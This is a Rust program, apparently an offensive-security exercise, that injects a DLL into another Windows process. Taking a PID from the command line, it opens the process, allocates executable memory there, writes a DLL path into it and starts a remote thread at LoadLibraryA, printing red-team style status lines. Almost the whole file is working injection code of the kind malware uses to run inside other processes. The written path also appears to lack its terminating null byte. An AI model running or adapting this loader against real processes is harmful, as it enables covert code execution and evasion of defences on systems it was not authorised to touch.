use std::env;
use std::ffi::c_void;
use std::mem::{size_of_val};
use std::process::exit;
use windows::core::{s};
use windows::core::imp::PCSTR;
use windows::Win32::System::Threading::{CreateRemoteThread, OpenProcess, PROCESS_VM_OPERATION, PROCESS_VM_WRITE};
use windows::Win32::System::LibraryLoader::{GetModuleHandleA};
use windows::Win32::Foundation::{FARPROC, HMODULE};
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx};

#[link(name = "kernel32")]
extern "stdcall" {
    /// Get process address of a module. Returns a FARPROC, a "generic pointer to any function".
    fn GetProcAddress(h_module: HMODULE, lp_proc_name: PCSTR) -> FARPROC;
}

fn main() {
    // COLLECT ARGS
    let pid: u32 = collect_proc_addr();

    // GET HANDLE TO PID
    let h_process = unsafe { OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, false, pid) };
    let h_process = match h_process {
        Ok(h) => {
            println!("[+] Got handle to process ID {pid}, handle: {:?}", h);
            h // return the handle
        },
        Err(e) => panic!("[-] Could not get handle to pid {pid}, error: {e}"),
    };

    // GET HANDLE TO KERNEL32 DLL
    // so this will get us the handle to K32.dll in our process
    let h_kernel32 = unsafe { GetModuleHandleA(s!("Kernel32.dll")) };
    let h_kernel32 = match h_kernel32 {
        Ok(h) => {
            println!("[+] Handle to Kernel32.dll: {:?}", h);
            h
        }
        Err(e) => panic!("[-] Could not get handle to Kernel32.dll, {e}"),
    };

    // GET HANDLE TO LOAD LIBRARY

    // having to load kernel32 differently due to problems with the crate
    let load_library_fn_address = unsafe { GetProcAddress(h_kernel32, "LoadLibraryA\0".as_ptr()) };
    let load_library_fn_address = match load_library_fn_address {
        None => panic!("[-] Could not resolve the address of LoadLibraryA."),
        Some(address) => {
            println!("[+] Address of LoadLibraryA: {:?}", address);
            address
        }
    };

    // ALLOCATE MEMORY FOR OUR ADDRESS
    let path_to_dll = "path\\to\\dll\\rust_dll.dll";

    let remote_buffer_base_address = unsafe {
        VirtualAllocEx(h_process,
                        None,
                        size_of_val(path_to_dll),
                        MEM_COMMIT | MEM_RESERVE,
                       PAGE_EXECUTE_READWRITE,
    ) };

    if remote_buffer_base_address.is_null() {
        panic!("[-] Failed allocating memory into remote process for DLL Path");
    }

    println!("[+] Remote buffer base address: {:?}", remote_buffer_base_address);

    // Write to the buffer
    let mut bytes_written: usize = 0;
    let buff_result = unsafe {
        WriteProcessMemory(h_process, remote_buffer_base_address, path_to_dll.as_ptr() as *const c_void, size_of_val(path_to_dll), Some(&mut bytes_written as *mut usize))
    };

    match buff_result {
        Ok(_) => println!("[+] Bytes written to remote process: {:?}", bytes_written),
        Err(e) => panic!("[-] Error writing remote process memory: {e}"),
    }

    // correctly cast the address of LoadLibraryA
    let load_library_fn_address: Option<unsafe extern "system" fn(*mut c_void) -> u32> = Some(
        unsafe { std::mem::transmute(load_library_fn_address) }
    );

    let mut thread: u32 = 0;

    // create thread
    let h_thread = unsafe { CreateRemoteThread(
        h_process,
        None, // default security descriptor
        0, // default stack size
        load_library_fn_address,
        Some(remote_buffer_base_address),
        0,
        Some(&mut thread as *mut u32),
    )};

    match h_thread {
        Ok(h) => println!("[+] Thread started, handle: {:?}", h),
        Err(e) => panic!("[-] Error occurred creating thread: {e}"),
    }
}

fn collect_proc_addr() -> u32 {
    let args: Vec<String> = env::args().collect();

    if args.len() != 2 {
        eprintln!("[-] PID required.");
        exit(1);
    }

    let pid = args[1].clone();
    let pid_as_int: u32 = pid.parse().unwrap();

    pid_as_int
}